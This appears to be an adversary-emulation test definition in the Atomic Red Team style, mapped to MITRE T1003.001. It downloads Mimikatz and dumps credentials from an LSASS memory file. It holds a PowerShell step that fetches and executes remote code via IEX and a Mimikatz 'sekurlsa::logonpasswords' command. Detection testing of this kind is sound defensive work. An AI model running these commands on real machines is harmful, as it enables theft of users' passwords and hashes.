api_version: "2.0"
name: Offline Credential Theft With Mimikatz
description: |
    The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with
    Mimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.
args:
    - name: input_file
      type: path
      default: '%tmp%\lsass.DMP'
    - name: mimikatz_exe
      type: string
      default: PathToAtomicsFolder\..\ExternalPayloads\x64\mimikatz.exe
uuid: 453acf13-1dbd-47d7-b28a-172ce9228023
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1003: OS Credential Dumping'
    subtechniques:
        - 'T1003.001: LSASS Memory'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        Mimikatz must exist on disk at specified location (#{mimikatz_exe})
      inline: "if (Test-Path \"#{mimikatz_exe}\") {exit 0} else {{[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$basePath = Split-Path \"#{mimikatz_exe}\" | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n}}\n"
      executor: powershell
    - name: |
        Lsass dump must exist at specified location (#{input_file})
      inline: |
        cmd /c "if not exist #{input_file} (exit /b 1)"
      executor: powershell
    - name: offline-credential-theft-with-mimikatz
      inline: |
        "{{.Args.mimikatz_exe}}" "sekurlsa::minidump {{.Args.input_file}}" "sekurlsa::logonpasswords full" exit
      executor: command_prompt
      cleanup:
        inline: ""
        executor: command_prompt
